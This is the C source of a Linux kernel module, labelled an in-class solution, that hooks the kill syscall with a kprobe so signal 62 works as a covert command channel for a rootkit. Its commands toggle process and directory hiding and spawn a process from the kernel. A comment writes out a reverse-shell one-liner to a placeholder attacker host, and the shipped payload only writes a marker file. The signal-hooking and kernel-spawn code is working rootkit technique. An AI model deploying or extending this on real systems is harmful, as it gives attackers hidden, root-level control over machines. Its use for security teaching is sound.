/*
 * c2_demo.c — SOLUTION: Covert C2 via kill() signal hooking
 *
 * Hooks __arm64_sys_kill with a kprobe. When signal == 62, intercepts
 * the call as a C2 command encoded in the PID argument:
 *
 *   kill -62 0   → STATUS  (print current toggle states)
 *   kill -62 1   → toggle "process hiding"
 *   kill -62 2   → toggle "directory hiding"
 *   kill -62 3   → spawn a process from kernel (simulated reverse shell)
 *
 * The magic signal is swallowed by rewriting the syscall arguments to
 * kill(self, 0) — a harmless existence check. The sending process
 * does not receive signal 62.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/workqueue.h>
#include <asm/ptrace.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("In-class C2 demo — signal hooking with kprobes");

#define MAGIC_SIGNAL 62

#define CMD_STATUS          0
#define CMD_TOGGLE_PROCHIDE 1
#define CMD_TOGGLE_DIRHIDE  2
#define CMD_SPAWN_SHELL     3

/* ── Feature toggles ──────────────────────────────────────────────── */

static bool prochide_active;
static bool dirhide_active;

/* ── Deferred work: spawn process from kernel ─────────────────────
 *
 * call_usermodehelper() can sleep, so we can't call it directly from
 * a kprobe handler (atomic context). Instead, we schedule work on the
 * default kernel workqueue. The kworker thread runs in process context
 * where sleeping is allowed.
 *
 * In a real rootkit, the spawned command would be a reverse shell:
 *   /bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
 *
 * Here we just touch a marker file as proof of concept.
 * ─────────────────────────────────────────────────────────────────── */

static void spawn_work_fn(struct work_struct *w)
{
	/* The command to run in userspace */
	char *argv[] = {
		"/bin/sh", "-c",
		"echo kernel-spawned > /tmp/kernel_spawned",
		NULL
	};
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};

	pr_info("c2_demo: spawning process from kernel (simulated reverse shell)\n");
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	kfree(w);
}

static void schedule_spawn(void)
{
	struct work_struct *work;

	work = kmalloc(sizeof(*work), GFP_ATOMIC);
	if (!work) {
		pr_err("c2_demo: failed to allocate spawn work\n");
		return;
	}
	INIT_WORK(work, spawn_work_fn);
	schedule_work(work);
}

/* ── Kprobe pre-handler ───────────────────────────────────────────── */

static int c2_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
	struct pt_regs *user_regs = (struct pt_regs *)regs->regs[0];
	int sig = (int)user_regs->regs[1];
	int cmd = (int)user_regs->regs[0];

	if (sig != MAGIC_SIGNAL)
		return 0;

	switch (cmd) {
	case CMD_STATUS:
		pr_info("c2_demo: STATUS — prochide=%d dirhide=%d\n",
			prochide_active, dirhide_active);
		break;
	case CMD_TOGGLE_PROCHIDE:
		prochide_active = !prochide_active;
		pr_info("c2_demo: process hiding %s\n",
			prochide_active ? "ENABLED" : "DISABLED");
		break;
	case CMD_TOGGLE_DIRHIDE:
		dirhide_active = !dirhide_active;
		pr_info("c2_demo: directory hiding %s\n",
			dirhide_active ? "ENABLED" : "DISABLED");
		break;
	case CMD_SPAWN_SHELL:
		schedule_spawn();
		break;
	default:
		pr_warn("c2_demo: unknown command %d\n", cmd);
		break;
	}

	/* Swallow: rewrite to kill(self, 0) */
	user_regs->regs[0] = current->pid;
	user_regs->regs[1] = 0;

	return 0;
}

/* ── Kprobe definition ────────────────────────────────────────────── */

static struct kprobe c2_kp = {
	.symbol_name = "__arm64_sys_kill",
	.pre_handler = c2_pre_handler,
};

/* ── Module init / exit ───────────────────────────────────────────── */

static int __init c2_demo_init(void)
{
	int ret;

	ret = register_kprobe(&c2_kp);
	if (ret < 0) {
		pr_err("c2_demo: kprobe registration failed: %d\n", ret);
		return ret;
	}

	pr_info("c2_demo: C2 active on signal %d\n", MAGIC_SIGNAL);
	return 0;
}

static void __exit c2_demo_exit(void)
{
	unregister_kprobe(&c2_kp);
	pr_info("c2_demo: kprobe removed\n");
}

module_init(c2_demo_init);
module_exit(c2_demo_exit);
